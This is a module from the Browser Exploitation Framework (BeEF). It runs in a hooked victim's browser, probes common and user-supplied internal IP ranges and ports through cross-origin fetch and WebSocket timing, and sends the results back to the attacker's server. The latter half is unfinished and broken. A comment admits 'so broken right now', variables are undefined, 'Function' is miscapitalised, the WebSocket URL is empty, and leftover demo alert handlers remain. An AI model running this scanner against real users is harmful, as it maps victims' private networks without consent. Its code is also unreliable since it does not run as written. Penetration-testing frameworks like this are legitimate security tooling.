//
// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var ipRange = "<%= @ipRange %>";
  var ports   = "<%= @ports %>";
  var threads = parseInt("<%= @threads %>", 10);
  var timeout = parseInt("<%= @timeout %>", 10)*1000;
  var wait    = parseInt("<%= @wait %>", 10)*1000;

  if(!beef.browser.hasCors()) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
    return;
  }

  // set target ports
  if (ports != null) {
    ports = ports.split(',');
  }

  // set target IP addresses
  if (ipRange == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
      return;
    }
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // the fourth octet will be iterated.
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (var i = lowerBound; i <= upperBound; i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Cross-Origin Scanner (CORS)] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) {
        timer = setInterval(this.process, frequency);
      }
    }

  }

  beef.debug("[Cross-Origin Scanner (CORS)] Starting scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");

  // create worker queue
  var workers = new Array();
  for (w=0; w < threads; w++) {
    workers.push(new WorkerQueue(wait));
  }

//Below is so broken right now
//Firefox returns open ports speaking non-http as response.status = 0
//Chrome returns open ports speaking non-http as identical to closed ports. However time difference is 70ms for websocket attempt on non-http but open, 1000ms for closed. 
//Will hates all of the above, and it is the best way to go forward. The sw_port_scan code incorporates these detectable deviations.

// Create a fetch abort controller that will kill code that runs for too long


fetch('http://' + ipaddress+":"+port, {mode: 'no-cors'})
//what to do after fetch returns
.then(function(res){ 
// If there is a status returned then Mozilla Firefox 68.5.0esr made a successful connection
// This includes where it is not http and open
console.log(Number.isInteger(res.status))
}
).catch(function(ex){
// If we caught an error this could be one of two things. It's closed (because there was no service), it's open (because the system does not
// respond with http). Therefore we can split on 500 ms response time on a websocket (>500 ms close, <500ms open but not http)
check_socket(ipaddress, port)
})


// If we get to this stage
Function check_socket(ipaddress,port){
let socket = new WebSocket("ws://");


socket.onopen = function(e) {  alert("[open] Connection established");  alert("Sending to server");  socket.send("My name is John");};
socket.onmessage = function(event) {  alert(`[message] Data received from server: ${event.data}`);};
socket.onclose = function(event) {  if (event.wasClean) {    alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);  } else {    // e.g. server process killed or network down    // event.code is usually 1006 in this case    alert('[close] Connection died');  }};
socket.onerror = function(error) {  alert(`[error] ${error.message}`);};
}



});

